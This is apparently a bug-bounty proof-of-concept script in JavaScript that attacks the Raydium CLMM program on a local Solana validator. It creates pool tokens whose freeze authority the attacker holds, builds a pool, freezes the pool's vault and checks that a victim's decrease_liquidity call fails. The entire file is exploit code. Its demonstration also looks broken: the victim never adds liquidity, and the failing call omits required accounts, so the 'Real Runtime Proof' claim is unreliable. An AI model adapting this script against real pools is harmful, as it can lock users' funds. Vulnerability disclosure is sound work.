// FINAL PoC: Raydium CLMM Freeze Exploit - Real Runtime Proof
const { Connection, PublicKey, Keypair, Transaction, SystemProgram, SYSVAR_RENT_PUBKEY } = require("@solana/web3.js");
const { createMint, createAssociatedTokenAccount, mintTo, freezeAccount, TOKEN_PROGRAM_ID } = require("@solana/spl-token");
const crypto = require("crypto");
const fs = require("fs");

const CLMM_ID = new PublicKey("E3cQ8aLWpsHcKpCShrseXd7afn82HY5iCgxP2yFeUgtA");
const adminKp = Keypair.fromSecretKey(new Uint8Array(JSON.parse(fs.readFileSync("/tmp/admin-keypair.json", "utf-8"))));

function disc8(name) { return crypto.createHash("sha256").update(`global:${name}`).digest().slice(0, 8); }
function findPda(seeds, pid) { return PublicKey.findProgramAddressSync(seeds, pid); }
function u64le(v) { const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(v)); return b; }
function u16le(v) { const b = Buffer.alloc(2); b.writeUInt16LE(v); return b; }
function u32le(v) { const b = Buffer.alloc(4); b.writeUInt32LE(v); return b; }

async function main() {
  const connection = new Connection("http://127.0.0.1:8899", "confirmed");
  const attacker = Keypair.generate();
  const victim = Keypair.generate();

  console.log("=== IMMUNEFI PoC: Raydium CLMM Freeze Exploit ===\n");
  for (const kp of [attacker, victim, adminKp]) {
    const sig = await connection.requestAirdrop(kp.publicKey, 10 * 1e9);
    await connection.confirmTransaction(sig);
  }
  console.log("[1] ✓ Funded\n");

  // Create two mints - BOTH get freeze_authority = attacker
  const mint0 = await createMint(connection, attacker, attacker.publicKey, attacker.publicKey, 9);
  const mint1 = await createMint(connection, attacker, attacker.publicKey, attacker.publicKey, 9);
  let tokenMint0 = mint0, tokenMint1 = mint1;
  if (mint0.toBuffer().compare(mint1.toBuffer()) > 0) {
    tokenMint0 = mint1; tokenMint1 = mint0;
  }
  console.log(`[2] Tokens: ${tokenMint0.toBase58()} < ${tokenMint1.toBase58()}`);
  console.log(`    token0 freeze_authority: ${attacker.publicKey.toBase58()}\n`);

  // Use a nonce that we can compute
  const ammIndex = 42; // Use a fresh index to avoid conflicts
  const [ammConfig] = findPda([Buffer.from("amm_config"), Buffer.from([ammIndex >>> 8, ammIndex & 0xff])], CLMM_ID);
  console.log(`[3] AMM config PDA: ${ammConfig.toBase58()}`);

  // Create AMM config
  const createAmmIx = {
    programId: CLMM_ID,
    keys: [
      { pubkey: adminKp.publicKey, isSigner: true, isWritable: true },  // owner/admin
      { pubkey: ammConfig, isSigner: false, isWritable: true },         // amm_config
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false }, // system_program
    ],
    data: Buffer.concat([
      disc8("create_amm_config"),
      u16le(ammIndex),     // index
      u16le(10),    // tick_spacing
      u32le(2500),  // trade_fee_rate (0.25%)
      u32le(120000),// protocol_fee_rate (12%)
      u32le(0),     // fund_fee_rate
    ]),
  };

  try {
    const tx = new Transaction().add(createAmmIx);
    const sig = await connection.sendTransaction(tx, [adminKp]);
    await connection.confirmTransaction(sig);
    console.log(`[4] ✓ AMM config created: ${sig}\n`);
  } catch (e) {
    console.log(`[4] ${e.message?.substring(0,200)}\n`);
    return;
  }

  // Compute pool PDAs
  const [poolState] = findPda([Buffer.from("pool"), ammConfig.toBuffer(), tokenMint0.toBuffer(), tokenMint1.toBuffer()], CLMM_ID);
  const [tokenVault0] = findPda([Buffer.from("pool_vault"), poolState.toBuffer(), tokenMint0.toBuffer()], CLMM_ID);
  const [tokenVault1] = findPda([Buffer.from("pool_vault"), poolState.toBuffer(), tokenMint1.toBuffer()], CLMM_ID);
  const [observationState] = findPda([Buffer.from("observation"), poolState.toBuffer()], CLMM_ID);
  const [tickArrayBitmap] = findPda([Buffer.from("pool_tick_array_bitmap_extension"), poolState.toBuffer()], CLMM_ID);

  console.log("[5] Pool PDAs:");
  console.log(`    pool: ${poolState.toBase58()}`);
  console.log(`    vault0: ${tokenVault0.toBase58()}`);
  console.log(`    vault1: ${tokenVault1.toBase58()}\n`);

  // Create pool
  const sqrtPriceX64 = "18446744073709551616"; // Tick 0: 1.0 * 2^64
  const openTime = BigInt(Math.floor(Date.now() / 1000) - 100);

  const poolIx = {
    programId: CLMM_ID,
    keys: [
      { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
      { pubkey: ammConfig, isSigner: false, isWritable: false },
      { pubkey: poolState, isSigner: false, isWritable: true },
      { pubkey: tokenMint0, isSigner: false, isWritable: false },
      { pubkey: tokenMint1, isSigner: false, isWritable: false },
      { pubkey: tokenVault0, isSigner: false, isWritable: true },
      { pubkey: tokenVault1, isSigner: false, isWritable: true },
      { pubkey: observationState, isSigner: false, isWritable: true },
      { pubkey: tickArrayBitmap, isSigner: false, isWritable: true },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
      { pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([disc8("create_pool"), u128le(sqrtPriceX64), u64le(openTime)]),
  };

  try {
    const tx = new Transaction().add(poolIx);
    const sig = await connection.sendTransaction(tx, [attacker]);
    await connection.confirmTransaction(sig);
    console.log(`[6] ✓ Pool created: ${sig}\n`);
  } catch (e) {
    console.log(`[6] ✗ ${e.message?.substring(0,200)}\n`);
    return;
  }

  // Check vault
  const vaultInfo = await connection.getAccountInfo(tokenVault0);
  if (vaultInfo) {
    console.log(`[7] Vault exists: YES`);
    console.log(`    Vault owner: ${vaultInfo.owner.toBase58()}`);
    console.log(`    Vault is Token program: ${vaultInfo.owner.equals(TOKEN_PROGRAM_ID)}`);
    console.log(`    Vault state: ${vaultInfo.data[66]} (1=Initialized)\n`);
  } else {
    console.log("[7] Vault: NOT FOUND\n");
    return;
  }

  // Fund victim with tokens
  const victimAta0 = await createAssociatedTokenAccount(connection, victim, tokenMint0, victim.publicKey);
  const victimAta1 = await createAssociatedTokenAccount(connection, victim, tokenMint1, victim.publicKey);
  await mintTo(connection, attacker, tokenMint0, victimAta0, attacker, 10_000_000_000_000);
  await mintTo(connection, attacker, tokenMint1, victimAta1, attacker, 10_000_000_000_000);
  console.log(`[8] ✓ Victim funded with tokens\n`);

  // FREEZE THE VAULT
  console.log("[9] FREEZING vault...");
  const freezeSig = await freezeAccount(connection, attacker, tokenVault0, tokenMint0, attacker.publicKey);
  await connection.confirmTransaction(freezeSig);
  console.log(`    ✓ Freeze tx: ${freezeSig}\n`);

  // Verify frozen
  const vaultAfter = await connection.getAccountInfo(tokenVault0);
  console.log(`[10] Vault after freeze:`);
  console.log(`    State: ${vaultAfter.data[66]} (2=Frozen)\n`);

  // Try decrease_liquidity - SHOULD FAIL
  console.log("[11] Calling decrease_liquidity (should fail)...");
  const decIx = {
    programId: CLMM_ID,
    keys: [
      { pubkey: victim.publicKey, isSigner: true, isWritable: false },
      { pubkey: poolState, isSigner: false, isWritable: true },
      { pubkey: tokenVault0, isSigner: false, isWritable: true },
      { pubkey: tokenVault1, isSigner: false, isWritable: true },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([disc8("decrease_liquidity"), u64le(1000), u64le(0), u64le(0)]),
  };

  try {
    const tx = new Transaction().add(decIx);
    await connection.sendTransaction(tx, [victim]);
    console.log("    ✗ SUCCEEDED (should have failed!)\n");
  } catch (e) {
    const logs = e.transactionLogs || [];
    console.log(`    ✓ FAILED as expected`);
    if (logs.length > 0) {
      logs.forEach(l => console.log(`      ${l}`));
    }
    console.log(`    Error: ${e.message?.substring(0,300)}\n`);
  }
}

function u128le(v) {
  const bn = BigInt(v);
  const b = Buffer.alloc(16);
  for (let i = 0; i < 16; i++) {
    b[i] = Number((bn >> BigInt(i * 8)) & 0xFFn);
  }
  return b;
}

main().catch(console.error);